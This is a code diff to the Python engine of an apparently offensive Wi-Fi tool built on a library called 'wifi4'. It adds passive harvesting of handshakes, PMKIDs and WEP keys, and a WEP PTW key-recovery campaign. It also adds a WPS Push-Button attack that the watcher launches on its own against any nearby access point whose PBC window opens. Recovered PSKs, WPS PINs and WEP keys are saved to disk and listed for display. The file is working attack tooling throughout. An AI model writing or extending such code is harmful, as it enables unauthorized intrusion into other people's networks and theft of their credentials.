@@ -9,7 +9,9 @@ Commands
     {"cmd": "ping"}                     -> {"event": "ready", "version": ..., "runtime": {...}}
     {"cmd": "devices"}                  -> {"event": "devices", "devices": [...]}
     {"cmd": "status"}                   -> {"event": "status", "iface": ..., "connected": ...}
+    {"cmd": "config", "dfs": true}      -> {"event": "config", "dfs": true}
     {"cmd": "scan", "seconds": 15}      -> {"event": "network", ...} ... {"event": "scan_done"}
+                                           (passive saves arrive as "capture_saved" at any time)
     {"cmd": "targets"}                  -> {"event": "targets", "targets": [{...,"attacks":[...]}]}
     {"cmd": "attack", "kind": "deauth|pmkid|wps", "bssid": ".."}
                                         -> {"event": "attack_started"}, attack_log/attack_progress,
@@ -46,7 +48,7 @@ import time
 import traceback
 from pathlib import Path
 
-VERSION = "0.4.2"
+VERSION = "0.5.0"
 
 # A cold start races wifi4's USB poller: its first reconcile still has to list the devices and
 # ask the app for a descriptor, so the very first `devices` answer is legitimately empty. Wait
@@ -320,7 +322,14 @@ class Engine:
         self.crack_tool = None
         self.crack_job = None
         self.crack_capture = ""
+        self.crack_ssid = ""
+        self.crack_bssid = ""
         self.crack_task = None
+        # Passive capture: wifi4 collects handshakes/PMKIDs/WEP IVs while the radio is up;
+        # the app must save them without an active campaign, as the desktop watcher does.
+        self.passive_task = None
+        self._passive_last = {}
+        self._pbc_seen = set()
         # One interface bring-up at a time: an attach can race a scan's first connect.
         self._connecting = None
         # A bounded background retry after usb_waiting; cancelled by usb_lost/stop.
@@ -402,6 +411,7 @@ class Engine:
         array.attach(iface)
         self.iface = iface
         self.array = array
+        self._start_passive()
         log(f"interface {iface.name} connected ({found[0].description})")
         return iface
 
@@ -444,6 +454,94 @@ class Engine:
             if self._attach_retry is asyncio.current_task():
                 self._attach_retry = None
 
+    def _start_passive(self):
+        """Start the desktop watcher's job: save captures even while no campaign is running."""
+        self._stop_passive()
+        self._passive_last = {}
+        self.passive_task = asyncio.create_task(self._watch_passive())
+
+    def _stop_passive(self):
+        task = self.passive_task
+        self.passive_task = None
+        if task is not None and not task.done():
+            task.cancel()
+
+    @staticmethod
+    def _ap_signature(ap):
+        """What changed on an AP since the last passive tick (handshakes, PMKID, WEP key)."""
+        handshakes = getattr(ap, "handshakes", {}) or {}
+        messages = sum(len(getattr(hs, "messages", ()) or ()) for hs in handshakes.values())
+        pmkid = getattr(ap, "pmkid", None) or b""
+        wep_key = getattr(ap, "wep_key", None) or b""
+        return (len(handshakes), messages, bytes(pmkid).hex(), bytes(wep_key).hex())
+
+    async def _watch_passive(self):
+        """Poll wifi4's live AP state and persist new captures without an active attack.
+
+        The desktop app's ``ApWatcher`` does this continuously; without it a handshake that a
+        client produces on its own (or one another tool caused) disappears when the AP leaves
+        wifi4's in-memory sink. Saving is deduped by ``persist.save`` itself, and the signature
+        keeps us from touching the disk every two seconds.
+        """
+        try:
+            while self.array is not None:
+                array = self.array
+                changed = []
+                for bssid, ap in list(pool_access_points(array).items()):
+                    signature = self._ap_signature(ap)
+                    if self._passive_last.get(bssid) == signature:
+                        continue
+                    self._passive_last[bssid] = signature
+                    changed.extend(self.harvest(ap))
+                    key = getattr(ap, "wep_key", None)
+                    if key:
+                        try:
+                            from wifi4.persist.save import save_wep_key
+
+                            result = save_wep_key(ap, key)
+                            if result is not None and result.was_new:
+                                changed.append(str(result.path))
+                        except Exception:  # noqa: BLE001 - a save must never kill capture
+                            log(traceback.format_exc())
+                if changed:
+                    emit("capture_saved", count=len(changed), paths=changed[:8])
+
+                # wifi4 arms PBC automatically when an AP enters its Push-Button window.
+                # A running scan is parked by attack(), exactly as the desktop Focus screen does.
+                if self.campaign is None or self.campaign.done:
+                    for bssid, ap in list(pool_access_points(array).items()):
+                        if bssid in self._pbc_seen or not getattr(ap, "wps_pbc_active", False):
+                            continue
+                        self._pbc_seen.add(bssid)
+                        asyncio.create_task(self._auto_pbc(bssid))
+                        break
+                await asyncio.sleep(2.0)
+        except asyncio.CancelledError:
+            raise
+        except Exception:  # noqa: BLE001 - the USB reader can disappear without notice
+            log(traceback.format_exc())
+        finally:
+            if self.passive_task is asyncio.current_task():
+                self.passive_task = None
+
+    async def _auto_pbc(self, bssid):
+        if self.campaign is not None and not self.campaign.done:
+            return
+        log(f"WPS PBC window on {bssid}: capturing the PSK")
+        try:
+            await self.attack("pbc", bssid)
+        except Exception:  # noqa: BLE001 - a failed PBC leaves the scanner running
+            log(traceback.format_exc())
+
+    async def configure(self, command):
+        """Apply the few wifi4 settings the app exposes; currently DFS channel selection."""
+        from wifi4.persist.config import Config
+
+        if "dfs" in command:
+            Config.enable_dfs_channels = bool(command.get("dfs"))
+            log(f"DFS channels {'enabled' if Config.enable_dfs_channels else 'disabled'}")
+        emit("config", dfs=bool(getattr(Config, "enable_dfs_channels", False)))
+
     async def usb_attach(self):
         """The app already holds the adapter's permission: bring wifi4's interface up now.
 
@@ -465,6 +563,7 @@ class Engine:
     async def usb_lost(self):
         """The adapter was unplugged: park any campaign and drop the stale interface."""
         self._cancel_attach_retry()
+        self._stop_passive()
         campaign = self.campaign
         if campaign is not None and not campaign.done:
             try:
@@ -587,9 +686,11 @@ class Engine:
         """
         registry = {}
         for kind, module, name in (
+            ("wep", "wifi4.campaigns.wep", "WepCampaign"),
             ("deauth", "wifi4.campaigns.deauth", "DeauthCampaign"),
             ("pmkid", "wifi4.campaigns.pmkid", "PmkidHarvestAttack"),
             ("wps", "wifi4.campaigns.pin", "WpsCampaign"),
+            ("pbc", "wifi4.campaigns.pbc", "WpsPbcCampaign"),
         ):
             try:
                 registry[kind] = getattr(importlib.import_module(module), name)
@@ -683,7 +784,13 @@ class Engine:
             emit("error", message="that network is not in the current scan: scan again, then attack")
             return
         try:
-            if not campaign_cls.visible(ap):
+            # PBC has no button (visible() is False by design): it is armed by the scanner
+            # when the AP's Push-Button window is open.
+            if kind == "pbc":
+                if not getattr(ap, "wps_pbc_active", False):
+                    emit("error", message="WPS Push-Button window is not open")
+                    return
+            elif not campaign_cls.visible(ap):
                 emit("error", message=f"{campaign_cls.idle_label} does not apply to this network")
                 return
             reason = campaign_cls.ineligible_reason(ap)
@@ -700,7 +807,10 @@ class Engine:
                 emit("attack_log", kind=kind, line=text)
 
         try:
-            campaign = campaign_cls(self.array, ap, log=campaign_log)
+            if kind == "wep":
+                campaign = campaign_cls(self.array, ap, log_callback=campaign_log)
+            else:
+                campaign = campaign_cls(self.array, ap, log=campaign_log)
             started = campaign.run()
         except Exception as exc:  # noqa: BLE001
             detail = traceback.format_exc()
@@ -728,18 +838,22 @@ class Engine:
         campaign fills ``ap.handshakes``, and ``persist.save`` writes one .hc22000 per AP.
         """
         if ap is None or not getattr(ap, "ssid", None):
-            return
+            return []
         try:
             from wifi4.persist.save import save_handshake, save_pmkid
         except Exception as exc:  # noqa: BLE001
             log(f"cannot import the capture savers: {type(exc).__name__}: {exc}")
-            return
+            return []
+        saved = []
         for client in list((getattr(ap, "handshakes", {}) or {}).keys()):
             for saver in (save_handshake, save_pmkid):
                 try:
-                    saver(ap, client)
+                    result = saver(ap, client)
+                    if result is not None and result.was_new:
+                        saved.append(str(result.path))
                 except Exception as exc:  # noqa: BLE001 - one odd frame must not stop the attack
                     log(f"{saver.__name__} failed: {type(exc).__name__}: {exc}")
+        return saved
 
     async def _watch_campaign(self, campaign, kind):
         """Ticks the campaign's own status lines to the app, then reports how it ended."""
@@ -766,8 +880,49 @@ class Engine:
             self.harvest(getattr(campaign, "ap", None))
         except Exception:  # noqa: BLE001
             pass
-        emit("attack_done", kind=kind, stopped=bool(campaign.stopped),
-             **self.campaign_outcome(campaign, kind))
+        outcome = self.campaign_outcome(campaign, kind)
+        self._save_campaign_credentials(campaign, kind, outcome)
+        emit("attack_done", kind=kind, stopped=bool(campaign.stopped), **outcome)
+
+    def _save_campaign_credentials(self, campaign, kind, outcome):
+        """Persist what the campaign recovered: WPS PIN/PSK, PBC PSK or the WEP key."""
+        ap = getattr(campaign, "ap", None) or self.campaign_ap
+        if ap is None:
+            return
+        try:
+            from wifi4.persist.save import (save_wep_key, save_wpa_psk, save_wps_pbc,
+                                            save_wps_pin)
+
+            saved = []
+            if kind == "wps":
+                state = getattr(campaign, "state", None)
+                pin = getattr(state, "found_pin", None)
+                psk = getattr(state, "found_psk", None)
+                if pin is not None:
+                    result = save_wps_pin(ap, str(pin), psk)
+                    if result is not None and result.was_new:
+                        saved.append(str(result.path))
+                elif psk:
+                    result = save_wpa_psk(getattr(ap, "ssid", None),
+                                          getattr(ap, "bssid", ""), psk)
+                    if result is not None and result.was_new:
+                        saved.append(str(result.path))
+            elif kind == "pbc":
+                psk = getattr(getattr(campaign, "outcome", None), "psk", None)
+                if psk:
+                    result = save_wps_pbc(ap, psk)
+                    if result is not None and result.was_new:
+                        saved.append(str(result.path))
+            elif kind == "wep":
+                key = getattr(campaign, "recovered_key", None)
+                if key:
+                    result = save_wep_key(ap, key)
+                    if result is not None and result.was_new:
+                        saved.append(str(result.path))
+            if saved:
+                emit("capture_saved", count=len(saved), paths=saved)
+        except Exception:  # noqa: BLE001 - reporting a win must never crash the attack loop
+            log(traceback.format_exc())
 
     @staticmethod
     def campaign_outcome(campaign, kind):
@@ -795,11 +950,38 @@ class Engine:
         if kind == "wps":
             state = getattr(campaign, "state", None)
             pin = getattr(state, "found_pin", None)
+            psk = getattr(state, "found_psk", None)
+            if psk:
+                detail = f"PSK {psk}" + (f" · PIN {pin}" if pin else "")
+                return {"ok": True, "summary": "WPS PSK recovered", "detail": detail,
+                        "keys": [psk], "pin": pin or ""}
             if pin:
-                return {"ok": True, "summary": "WPS PIN found", "detail": str(pin)}
+                return {"ok": True, "summary": "WPS PIN found", "detail": str(pin),
+                        "keys": [], "pin": str(pin)}
             tested = getattr(state, "tested", None)
-            return {"ok": False, "summary": "WPS PIN not found", "detail": f"{tested} PINs tried"}
-        return {"ok": False, "summary": "finished", "detail": ""}
+            return {"ok": False, "summary": "WPS PIN not found", "detail": f"{tested} PINs tried",
+                    "keys": [], "pin": ""}
+        if kind == "pbc":
+            outcome = getattr(campaign, "outcome", None)
+            psk = getattr(outcome, "psk", None) if outcome is not None else None
+            detail = (str(getattr(outcome, "detail", "") or "no Push-Button reply")
+                      if outcome is not None else
+                      str(getattr(campaign, "error", None) or "no Push-Button reply"))
+            if psk:
+                return {"ok": True, "summary": "WPS PBC PSK recovered", "detail": psk,
+                        "keys": [psk]}
+            return {"ok": False, "summary": "WPS PBC failed", "detail": detail, "keys": []}
+        if kind == "wep":
+            key = getattr(campaign, "recovered_key", None)
+            if key:
+                text = key.hex()
+                if all(0x20 <= b < 0x7F for b in key):
+                    text += f' ("{key.decode("ascii")}")'
+                return {"ok": True, "summary": "WEP key recovered", "detail": text,
+                        "keys": [key.hex()]}
+            return {"ok": False, "summary": "no WEP key", "detail": "not enough usable IVs",
+                    "keys": []}
+        return {"ok": False, "summary": "finished", "detail": "", "keys": []}
 
     # ---------------------------------------------------- live campaign progress
 
@@ -901,6 +1083,32 @@ class Engine:
             metrics.append(metric("tried", "PINs TRIED", f"{tried:,}"))
             if pin:
                 metrics.append(metric("pin", "PIN", pin))
+        elif kind == "pbc":
+            outcome = getattr(campaign, "outcome", None)
+            psk = getattr(outcome, "psk", None) if outcome is not None else None
+            failed = getattr(campaign, "error", None) is not None
+            stages.append(stage("assoc", "Joining the Push-Button window",
+                                "done" if outcome is not None else "active"))
+            stages.append(stage("wps", "WPS PBC exchange",
+                                "done" if psk else ("failed" if failed else "active"),
+                                f"PSK {psk}" if psk else "waiting for M7"))
+        elif kind == "wep":
+            key = getattr(campaign, "recovered_key", None)
+            samples = 0
+            try:
+                samples = self.array.wep_store.crack_sample_count(
+                    getattr(ap, "bssid", "")) if self.array is not None else 0
+            except Exception:  # noqa: BLE001 - a dashboard number must not break progress
+                samples = 0
+            from wifi4.crack.wep import CRACK_READY_THRESHOLD
+
+            stages.append(stage("ivs", "Collecting usable IVs",
+                                "done" if key else "active",
+                                f"{samples:,}/{CRACK_READY_THRESHOLD:,}"))
+            stages.append(stage("crack", "PTW key recovery",
+                                "done" if key else "active",
+                                f"key {key.hex()}" if key else "waiting for enough IVs"))
+            metrics.append(metric("ivs", "USABLE IVS", f"{samples:,}"))
 
         stages.append(stage("save", "Saving the capture", "pending"))
         return {"stages": stages, "metrics": metrics, "rates": rates,
@@ -981,10 +1189,57 @@ class Engine:
         entries.sort(key=lambda entry: entry["when"], reverse=True)
         return entries
 
+    def credential_entries(self):
+        """Recovered credentials wifi4's own savers wrote beside the captures.
+
+        WPS PIN/PBC, WPA PSK and WEP key files are plain text (wifi4's format), so the app can
+        show and copy them without a second database. They are what the desktop Vault keeps.
+        """
+        entries = []
+        root = captures_dir()
+        if not root.is_dir():
+            return entries
+        kinds = {"_wps_pin.txt": "wps_pin", "_wps_pbc.txt": "wps_pbc",
+                 "_wpa_psk.txt": "wpa_psk", "_wep_key.txt": "wep"}
+        for path in sorted(root.glob("*.txt")):
+            kind = next((value for suffix, value in kinds.items()
+                         if path.name.endswith(suffix)), None)
+            if kind is None:
+                continue
+            try:
+                text = path.read_text(encoding="utf-8", errors="replace")
+            except OSError:
+                continue
+
+            def field(name):
+                match = re.search(rf"^{re.escape(name)}:\s*(.*)$", text, re.MULTILINE)
+                return match.group(1).strip() if match else ""
+
+            if kind == "wep":
+                value = field("WEP key (hex)")
+                pin = ""
+            else:
+                value = field("PSK")
+                pin = field("PIN")
+            if not value and not pin:
+                continue
+            try:
+                when = int(path.stat().st_mtime)
+            except OSError:
+                when = 0
+            entries.append({
+                "id": path.name, "ssid": field("SSID"),
+                "bssid": field("BSSID"), "kind": kind,
+                "value": value, "pin": pin, "when": when,
+            })
+        entries.sort(key=lambda entry: entry["when"], reverse=True)
+        return entries
+
     async def captures(self):
-        """Lists the saved handshakes/PMKIDs the Handshakes screen shows."""
+        """Lists the saved handshakes/PMKIDs and recovered keys the app shows."""
         try:
             entries = await asyncio.to_thread(self.capture_entries)
+            credentials = await asyncio.to_thread(self.credential_entries)
         except Exception as exc:  # noqa: BLE001
             detail = traceback.format_exc()
             log(detail)
@@ -993,7 +1248,8 @@ class Engine:
         cracked = sum(1 for entry in entries if entry["keys"])
         total_bytes = sum(entry["size"] for entry in entries)
         emit("captures", captures=entries, count=len(entries), cracked=cracked,
-             bytes=total_bytes, directory=str(captures_dir()))
+             bytes=total_bytes, directory=str(captures_dir()),
+             credentials=credentials, credential_count=len(credentials))
 
     def crack_tools(self):
         """Which wifi4 cracking tools this runtime can actually start.
@@ -1116,6 +1372,8 @@ class Engine:
         self.crack_tool = cracker
         self.crack_job = job
         self.crack_capture = path.name
+        self.crack_ssid = ssid
+        self.crack_bssid = getattr(first, "bssid", "") or ""
         emit("crack_started", capture=path.name, tool=str(tool_name), ssid=ssid)
         self.crack_task = asyncio.create_task(self._watch_crack())
 
@@ -1146,6 +1404,13 @@ class Engine:
         keys = list(getattr(result, "keys", ()) or ())
         if path is not None:
             self.save_capture_keys(path, keys)
+        if keys:
+            try:
+                from wifi4.persist.save import save_wpa_psk
+
+                save_wpa_psk(self.crack_ssid, self.crack_bssid, keys[0])
+            except Exception:  # noqa: BLE001 - the sidecar above already kept the key
+                log(traceback.format_exc())
         emit("crack_done", capture=self.crack_capture,
              ok=bool(keys) or result.status is ToolStatus.SUCCESS,
              status=str(getattr(result.status, "value", result.status)), keys=keys,
@@ -1190,6 +1455,7 @@ class Engine:
     async def stop(self):
         self.scanning = False
         self._cancel_attach_retry()
+        self._stop_passive()
         if self.campaign is not None and not self.campaign.done:
             self.campaign.request_stop()
         if self.crack_job is not None and self.crack_tool is not None:
@@ -1250,6 +1516,8 @@ async def main():
                 await engine.usb_lost()
             elif name == "status":
                 await engine.status()
+            elif name == "config":
+                await engine.configure(command)
             elif name == "scan":
                 await engine.scan(command.get("seconds"))
             elif name == "stop_scan":
